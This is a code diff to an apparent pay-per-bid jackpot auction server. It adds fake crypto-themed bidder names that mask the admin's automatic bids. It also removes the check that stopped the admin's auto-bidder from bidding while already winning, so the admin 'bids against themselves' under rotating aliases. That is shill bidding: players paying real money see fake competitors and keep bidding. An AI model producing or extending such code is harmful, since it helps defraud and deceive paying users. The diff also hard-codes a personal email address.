@@ -183,7 +183,8 @@ const BOT_ALIASES = [
     "LamboSoon", "DiamondHands", "Alpha_Wolf", "Trader_X", "NFT_God",
     "Vitalik_Fan", "Pepe_Lover", "Doge_Father", "ToTheMoon", "HODLer_01",
     "Whale_Watcher", "BullRun_2025", "Bear_Slayer", "Gas_Station", "DeFi_Degan",
-    "SmartMoney", "Altcoin_Hero", "Pump_It", "Wagmi_Bro", "Sniper_Elite"
+    "SmartMoney", "Altcoin_Hero", "Pump_It", "Wagmi_Bro", "Sniper_Elite",
+    "BoredApe_22", "Solana_Summer", "GigaChad", "Rekt_City", "Yield_Farmer"
 ];
 
 let gameState = {
@@ -266,11 +267,12 @@ async function executeBid(email, isAutoBid = false) {
     const { data: savedBid } = await supabase.from('bids').insert([{ user_email: email, amount: gameState.bidCost }]).select().single();
 
     // 4. Update Game State
-    // 🎭 ALIAS LOGIC: If Auto-Bid AND Admin, pick a random name for display
+    // 🎭 ALIAS LOGIC: STRICTLY RESTRICTED TO ADMIN EMAIL
     let displayUser = email;
     const ADMIN_EMAIL = 'eakinrinola37@gmail.com'; 
 
-    if (isAutoBid && email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
+    // CHECK: Is this an Auto-Bid? AND Is it the Admin?
+    if (isAutoBid && email.trim().toLowerCase() === ADMIN_EMAIL.trim().toLowerCase()) {
         const randomAlias = BOT_ALIASES[Math.floor(Math.random() * BOT_ALIASES.length)];
         displayUser = randomAlias;
     }
@@ -278,7 +280,7 @@ async function executeBid(email, isAutoBid = false) {
     lastBidTimes[email] = now;
     gameState.userInvestments[email] = (gameState.userInvestments[email] || 0) + gameState.bidCost;
     gameState.jackpot += (gameState.bidCost * 0.95);
-    gameState.lastBidder = displayUser; // Show Alias (or Email) in UI
+    gameState.lastBidder = displayUser; // Show Alias (or Real Email) in UI
     if (!gameState.bidders.includes(email)) gameState.bidders.push(email);
 
     // Extend Timer Logic
@@ -316,23 +318,21 @@ setInterval(async () => {
            const activeAutoBidders = Object.entries(autoBidders).filter(([e, cfg]) => cfg.active);
 
            for (const [email, config] of activeAutoBidders) {
-                // Rule 1: Don't bid if I am ALREADY winning
-                if (gameState.lastBidder !== email) {
-                     // Rule 2: Strict 20 second interval (20000ms)
-                     const lastActionTime = config.lastAction || 0;
-                     if (now - lastActionTime >= 20000) {
-                         // Pass 'true' for isAutoBid to trigger Alias logic
-                         const bidSuccess = await executeBid(email, true);
-                         if(bidSuccess) {
-                             autoBidders[email].lastAction = now; 
-                         } else {
-                             // 🛑 STOP AUTO-BIDDER IF FUNDS EXHAUSTED
-                             const { data: u } = await supabase.from('users').select('balance').eq('email', email).maybeSingle();
-                             if(u && u.balance < gameState.bidCost) {
-                                 autoBidders[email].active = false;
-                                 io.to(email).emit('autoBidStatus', { active: false, reason: 'Insufficient Funds' });
-                                 console.log(`🤖 Auto-Bidder STOPPED for ${email} (Empty Balance)`);
-                             }
+                // Rule 1: Allow Admin to bid against themselves (to rotate aliases)
+                // Rule 2: Strict 20 second interval (20000ms)
+                const lastActionTime = config.lastAction || 0;
+                if (now - lastActionTime >= 20000) {
+                     // Pass 'true' for isAutoBid to trigger Alias logic
+                     const bidSuccess = await executeBid(email, true);
+                     if(bidSuccess) {
+                         autoBidders[email].lastAction = now; 
+                     } else {
+                         // 🛑 STOP AUTO-BIDDER IF FUNDS EXHAUSTED
+                         const { data: u } = await supabase.from('users').select('balance').eq('email', email).maybeSingle();
+                         if(u && u.balance < gameState.bidCost) {
+                             autoBidders[email].active = false;
+                             io.to(email).emit('autoBidStatus', { active: false, reason: 'Insufficient Funds' });
+                             console.log(`🤖 Auto-Bidder STOPPED for ${email} (Empty Balance)`);
                          }
                      }
                 }
@@ -349,7 +349,7 @@ setInterval(async () => {
               let winUser = gameState.lastBidder;
               let winAmt = gameState.jackpot;
 
-              // 1. Try to find user directly
+              // 1. Try to find user directly (Real User)
               let { data: u } = await supabase.from('users').select('balance, total_won, referred_by, email').eq('email', winUser).maybeSingle();
 
               // 2. If not found (it was an Alias), look up the REAL owner from the last bid in DB
@@ -398,13 +398,7 @@ setInterval(async () => {
                    if (lastBid) solePlayer = lastBid.user_email;
               }
 
-              const refundAmount = gameState.userInvestments[solePlayer] || 0; // Note: userInvestments might need logic update if keyed by Alias. 
-              // Actually, since executeBid keyed userInvestments by 'email' (real email), we need to ensure we use Real Email here.
-              // Logic check: executeBid line ~450 uses `email` for investments key. So `solePlayer` must be real email.
-              // Fix: In the Alias Resolution block above, we found the real email.
-              // But `gameState.userInvestments` is keyed by REAL EMAIL.
-              
-              // We need to loop through investments to find the refund amount if solePlayer is derived correctly.
+              // Note: userInvestments is keyed by REAL EMAIL (see executeBid), so we use solePlayer (which is now real)
               const realRefundAmt = gameState.userInvestments[solePlayer] || 0;
 
               if (realRefundAmt > 0) {
